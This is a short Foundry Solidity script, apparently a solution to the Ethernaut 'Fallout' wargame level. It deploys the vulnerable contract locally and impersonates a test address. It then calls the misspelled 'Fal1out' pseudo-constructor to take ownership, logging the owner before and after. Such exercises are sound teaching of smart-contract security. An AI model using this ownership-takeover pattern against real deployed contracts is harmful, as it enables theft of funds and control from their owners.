// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/Fallout.sol";

contract FalloutHack is Script {
    Fallout public fallout;
    address public eoa;

    function run() public {
        fallout = new Fallout();
        eoa = address(1024);

        vm.deal(eoa, 1 ether);

        console.log("The owner of Fallout contract is:", fallout.owner());

        vm.startPrank(eoa);
        fallout.Fal1out();
        vm.stopPrank();

        console.log("After hacking...");
        console.log("The owner of Fallout contract is:", fallout.owner());
    }
}
